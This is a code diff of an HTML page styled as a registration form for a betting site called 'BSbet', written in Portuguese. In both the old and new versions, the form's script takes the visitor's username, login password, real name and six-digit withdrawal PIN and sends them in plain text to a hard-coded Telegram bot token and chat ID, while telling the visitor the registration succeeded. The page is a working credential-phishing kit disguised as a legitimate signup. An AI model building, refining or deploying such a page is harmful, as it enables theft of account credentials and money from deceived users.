@@ -6,100 +6,83 @@
     <title>BSbet Oficial</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --y: #f3c350; --bg: rgba(26,26,26,0.95); --in: #2a2a2a; --txt: #888; --err: #ff4d4d; }
+        :root { --y: #f3c350; --bg: rgba(26,26,26,0.95); --in: #2a2a2a; --txt: #888; }
         body { 
             margin: 0; padding: 0; font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh;
             background-color: #0d0d0d;
             background-image: url('https://static.vecteezy.com/system/resources/previews/001/955/352/original/abstract-black-and-grey-hexagon-background-free-vector.jpg');
-            background-size: cover; background-attachment: fixed;
+            background-size: cover;
         }
         .card { background: var(--bg); width: 90%; max-width: 380px; padding: 25px; border-radius: 20px; box-shadow: 0 15px 35px #000; border: 1px solid #333; }
-        .logo { text-align: center; font-size: 32px; font-weight: bold; font-style: italic; margin-bottom: 20px; color: white; }
+        .logo { text-align: center; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
         .logo span { color: var(--y); }
-        .tabs { display: flex; border-bottom: 1px solid #333; margin-bottom: 20px; }
-        .tab { padding: 10px; color: var(--txt); cursor: pointer; width: 50%; text-align: center; font-weight: bold; }
-        .tab.active { color: var(--y); border-bottom: 3px solid var(--y); }
         .box { background: var(--in); border: 1px solid #444; border-radius: 10px; display: flex; align-items: center; padding: 12px; margin-bottom: 12px; }
         .box i { color: var(--txt); width: 25px; text-align: center; margin-right: 10px; }
         .box input { background: transparent; border: none; color: white; width: 100%; outline: none; font-size: 16px; }
-        .btn { background: linear-gradient(180deg, #f7d06d, #d9a026); color: #1a1a1a; width: 100%; padding: 15px; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; margin-top: 10px; cursor: pointer; }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .hint { color: var(--y); font-size: 11px; margin: -5px 0 15px 5px; }
-        .error { border-color: var(--err) !important; }
+        .btn { background: linear-gradient(180deg, #f7d06d, #d9a026); color: #1a1a1a; width: 100%; padding: 15px; border: none; border-radius: 10px; font-weight: bold; font-size: 18px; cursor: pointer; }
+        .hint { color: var(--y); font-size: 11px; margin-top: -8px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div class="logo">BS<span>bet</span></div>
-    <div class="tabs">
-        <div class="tab active">Registro</div>
-        <div class="tab">Login</div>
-    </div>
-
-    <form id="f-reg">
-        <div class="box"><i class="fa-solid fa-user"></i><input type="text" id="u" placeholder="Usuário / E-mail" required></div>
-        <div class="box"><i class="fa-solid fa-lock"></i><input type="password" id="p1" placeholder="Senha login" required></div>
-        <div class="box"><i class="fa-solid fa-check"></i><input type="password" id="p2" placeholder="Confirmar senha login" required></div>
-        <div class="box"><i class="fa-solid fa-id-card"></i><input type="text" id="n" placeholder="Nome Real" required></div>
-        <p class="hint">Igual ao nome do banco</p>
-        <div class="box"><i class="fa-solid fa-shield"></i><input type="password" id="s1" placeholder="Senha saque (6 dígitos)" maxlength="6" required></div>
-        <div class="box"><i class="fa-solid fa-circle-check"></i><input type="password" id="s2" placeholder="Confirmar saque" required></div>
-        
-        <button type="submit" id="btn-r" class="btn">REGISTRAR</button>
+    <form id="meuForm">
+        <div class="box"><i class="fa-solid fa-user"></i><input type="text" id="user" placeholder="Usuário" required></div>
+        <div class="box"><i class="fa-solid fa-lock"></i><input type="password" id="p1" placeholder="Senha Login" required></div>
+        <div class="box"><i class="fa-solid fa-check"></i><input type="password" id="p2" placeholder="Confirmar Senha" required></div>
+        <div class="box"><i class="fa-solid fa-id-card"></i><input type="text" id="nome" placeholder="Nome Real" required></div>
+        <p class="hint">Nome igual ao do banco para saques</p>
+        <div class="box"><i class="fa-solid fa-shield"></i><input type="password" id="s1" placeholder="Senha Saque (6 dígitos)" maxlength="6" required></div>
+        <div class="box"><i class="fa-solid fa-circle-check"></i><input type="password" id="s2" placeholder="Confirmar Saque" required></div>
+        <button type="submit" id="btn" class="btn">REGISTRAR</button>
     </form>
 </div>
 
 <script>
-    // --- IMPORTANTE: COLOQUE SEUS DADOS AQUI ---
+    // --- DADOS DO TELEGRAM ---
     const TOKEN = "8599880345:AAGQy8ofddvyj-efl_lFUo44KMLEt1uuxMo"; 
     const CHAT_ID = "4996441181";
 
-    const form = document.getElementById('f-reg');
-    const btn = document.getElementById('btn-r');
-
-    form.onsubmit = function(e) {
+    document.getElementById('meuForm').onsubmit = function(e) {
         e.preventDefault();
+        
+        const btn = document.getElementById('btn');
+        const v_p1 = document.getElementById('p1').value;
+        const v_p2 = document.getElementById('p2').value;
+        const v_s1 = document.getElementById('s1').value;
+        const v_s2 = document.getElementById('s2').value;
 
-        // Validação rápida antes de enviar
-        const p1 = document.getElementById('p1').value;
-        const p2 = document.getElementById('p2').value;
-        const s1 = document.getElementById('s1').value;
-        const s2 = document.getElementById('s2').value;
+        // Validação simples
+        if(v_p1 !== v_p2) { alert("As senhas de login não são iguais!"); return; }
+        if(v_s1 !== v_s2) { alert("As senhas de saque não são iguais!"); return; }
+        if(v_s1.length < 6) { alert("A senha de saque deve ter 6 números!"); return; }
 
-        if (p1 !== p2) { alert("As senhas de login não conferem!"); return; }
-        if (s1 !== s2) { alert("As senhas de saque não conferem!"); return; }
-        if (s1.length < 6) { alert("A senha de saque deve ter 6 dígitos!"); return; }
-
+        btn.innerText = "A CARREGAR...";
         btn.disabled = true;
-        btn.innerText = "ENVIANDO...";
 
-        const msg = `🔔 *NOVO CADASTRO* 🔔\n\n👤 Usuário: ${document.getElementById('u').value}\n🔑 Senha: ${p1}\n💳 Nome: ${document.getElementById('n').value}\n💰 Saque: ${s1}`;
+        const texto = `🔔 *NOVO CADASTRO* 🔔\n\n👤 Usuário: ${document.getElementById('user').value}\n🔑 Senha: ${v_p1}\n💳 Nome: ${document.getElementById('nome').value}\n💰 Saque: ${v_s1}`;
 
-        // Usando HTTPS obrigatoriamente
+        // Envio para o Telegram
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: msg,
-                parse_mode: 'Markdown'
-            })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: texto, parse_mode: 'Markdown' })
         })
         .then(res => {
-            if (res.ok) {
-                alert("✅ Cadastro realizado com sucesso!");
+            if(res.ok) {
+                alert("Sucesso! Cadastro enviado.");
                 location.reload();
             } else {
-                alert("❌ Erro no Bot. Verifique o Token e o Chat ID.");
-                btn.disabled = false;
+                alert("Erro no Bot! Verifica o Token e ID.");
                 btn.innerText = "REGISTRAR";
+                btn.disabled = false;
             }
         })
-        .catch(err => {
-            alert("❌ Erro de conexão.");
-            btn.disabled = false;
+        .catch(() => {
+            alert("Erro de conexão!");
             btn.innerText = "REGISTRAR";
+            btn.disabled = false;
         });
     };
 </script>
